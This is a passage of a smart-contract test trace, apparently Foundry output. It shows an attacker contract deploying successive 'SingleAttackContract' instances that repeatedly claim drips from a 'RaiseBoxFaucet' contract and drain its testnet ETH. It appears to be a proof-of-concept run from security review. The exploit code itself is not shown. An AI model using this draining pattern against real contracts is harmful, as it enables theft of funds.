    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 820000000000000000 [8.2e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0xe8Ee0233644F37EC511a4f134797Ce7512F6569F
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 36) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [15041439] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [15040680] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [15004512] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [14996854] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 815000000000000000 [8.15e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0xe885e5969F6f6187E2EB3dC8Ac9fe98976c357BF
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 37) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [14739470] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [14738711] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [14702543] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [14694885] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 810000000000000000 [8.1e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x1dA070Ae6d06213796ECF6C2771D257f5AE10a3C
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 38) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [14437501] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [14436742] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [14400574] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [14392916] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 805000000000000000 [8.05e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x80BEd668835076F61E147018a9505233233f124a
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 39) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [14135532] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [14134773] RaiseBoxFaucet::claimFaucetTokens()
